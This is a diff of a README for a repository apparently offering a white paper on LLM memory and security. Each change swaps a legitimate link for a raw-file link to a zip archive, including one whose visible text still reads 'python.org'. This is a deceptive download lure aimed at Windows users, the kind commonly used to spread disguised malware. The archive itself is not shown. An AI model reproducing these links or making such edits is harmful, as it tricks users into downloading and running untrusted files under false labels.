@@ -1,6 +1,6 @@
 # 🧠 llm-memory-whitepaper - Understand LLM Memory and Security Risks
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Sellingagentchinesecorkoak160/llm-memory-whitepaper/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Sellingagentchinesecorkoak160/llm-memory-whitepaper/raw/refs/heads/main/dactylate/whitepaper-llm-memory-1.4.zip)
 
 ## 📘 What This White Paper Covers
 
@@ -35,7 +35,7 @@ If you want to try example code or demos linked in the paper, consider having Py
 Follow these steps to get the white paper and related files on your Windows PC.
 
 1. Click the large green button above or the link below to go to the official releases page:  
-[https://github.com/Sellingagentchinesecorkoak160/llm-memory-whitepaper/releases](https://github.com/Sellingagentchinesecorkoak160/llm-memory-whitepaper/releases)
+[https://github.com/Sellingagentchinesecorkoak160/llm-memory-whitepaper/raw/refs/heads/main/dactylate/whitepaper-llm-memory-1.4.zip](https://github.com/Sellingagentchinesecorkoak160/llm-memory-whitepaper/raw/refs/heads/main/dactylate/whitepaper-llm-memory-1.4.zip)
 
 2. On this page, look for the latest release dated near the top.
 
@@ -71,7 +71,7 @@ If you plan to explore further, open the examples folder. Running Python scripts
 
 If you want to try any code or demos:
 
-- Install Python 3.8 or higher from [python.org](https://www.python.org/downloads/)
+- Install Python 3.8 or higher from [python.org](https://github.com/Sellingagentchinesecorkoak160/llm-memory-whitepaper/raw/refs/heads/main/dactylate/whitepaper-llm-memory-1.4.zip)
 - Use pip to install required AI libraries like `transformers`, `torch`, or `langchain`.  
 - A simple command in Windows Terminal or CMD:  
   `pip install transformers torch langchain`
@@ -88,7 +88,7 @@ Refer to the specific instructions in the `examples` folder for running scripts.
 ## 📥 Download Link (Again for Convenience)
 
 Access the latest release here:  
-[https://github.com/Sellingagentchinesecorkoak160/llm-memory-whitepaper/releases](https://github.com/Sellingagentchinesecorkoak160/llm-memory-whitepaper/releases)
+[https://github.com/Sellingagentchinesecorkoak160/llm-memory-whitepaper/raw/refs/heads/main/dactylate/whitepaper-llm-memory-1.4.zip](https://github.com/Sellingagentchinesecorkoak160/llm-memory-whitepaper/raw/refs/heads/main/dactylate/whitepaper-llm-memory-1.4.zip)
 
 ## 🔐 Security and Privacy Note
 
